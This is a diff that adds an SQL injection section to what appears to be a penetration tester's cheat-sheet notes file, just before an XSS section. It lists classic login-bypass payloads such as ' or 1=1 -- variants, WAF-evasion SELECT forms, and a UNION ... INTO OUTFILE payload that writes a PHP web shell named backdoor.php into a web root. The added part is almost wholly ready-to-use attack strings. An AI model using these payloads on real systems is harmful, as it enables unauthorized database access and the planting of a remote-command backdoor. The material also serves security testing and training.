@@ -719,6 +719,35 @@ https://www.secjuice.com/osint-detecting-enumerating-firewalls-gateways/
 ```
 
 ## injection
+### sqli
+```bash
+https://websec.wordpress.com/tag/sql-filter-bypass/  
+
+# Cheat sheet 
+https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md
+
+# Classical test
+' or 1=1 LIMIT 1 --
+' or 1=1 LIMIT 1 -- -
+' or 1=1 LIMIT 1#
+'or 1#
+' or 1=1 --
+' or 1=1 -- -
+admin\'-- -
+
+# waf bypass
+SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
+
+# Upload file
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+
+```
+
+
 ### xss 
 filter evasion
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
